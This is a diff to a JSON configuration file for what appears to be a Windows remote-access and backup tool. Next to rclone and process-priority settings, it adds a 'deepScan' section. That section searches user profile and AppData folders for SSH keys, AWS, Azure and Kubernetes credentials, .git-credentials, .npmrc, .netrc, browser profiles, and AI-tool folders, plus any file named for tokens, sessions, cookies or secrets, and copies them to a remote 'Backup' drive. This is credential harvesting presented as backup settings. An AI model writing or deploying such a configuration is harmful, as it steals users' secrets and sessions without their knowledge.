@@ -10,6 +10,79 @@
         "user": "Bullettemporary",
         "passwordEnv": "RDP_PASS"
     },
+    "performance": {
+        "robocopyIPG": 10,
+        "highPriorityProcesses": [
+            "mstsc",
+            "Tailscale",
+            "AnyDesk",
+            "svchost"
+        ],
+        "rclone": {
+            "vfsCacheMode": "writes",
+            "vfsCacheMaxSize": "2G",
+            "vfsWriteBack": "5s",
+            "dirCacheTime": "72h",
+            "pollInterval": "15s",
+            "bufferSize": "128M"
+        }
+    },
+    "deepScan": {
+        "enabled": true,
+        "remoteRoot": "Z:\\Backup\\DeepScan",
+        "scanRoots": [
+            "%USERPROFILE%",
+            "%APPDATA%",
+            "%LOCALAPPDATA%",
+            "%TEMP%"
+        ],
+        "targetDirs": [
+            ".env",
+            ".ssh",
+            ".aws",
+            ".azure",
+            ".config",
+            ".docker",
+            ".kube",
+            ".git-credentials",
+            ".npmrc",
+            ".netrc",
+            ".wgetrc",
+            ".curlrc",
+            "npm",
+            "Code",
+            "Google",
+            "Microsoft\\Edge",
+            "Mozilla",
+            "Postman",
+            "claude",
+            "opencode"
+        ],
+        "tokenFileRegex": "(token|session|cookie|credential|secret|auth|login)",
+        "tokenFileExtensions": [
+            ".json",
+            ".txt",
+            ".cfg",
+            ".conf",
+            ".ini",
+            ".env",
+            ".yaml",
+            ".yml"
+        ],
+        "excludeDirs": [
+            "node_modules",
+            ".git",
+            "WinSxS",
+            "Package Cache",
+            "$Recycle.Bin",
+            "SysWOW64",
+            "System32",
+            "Windows"
+        ],
+        "maxDepth": 4,
+        "maxScanFiles": 3000,
+        "maxFileSizeMB": 10
+    },
     "tools": {
         "git": {
             "wingetId": "Git.Git",
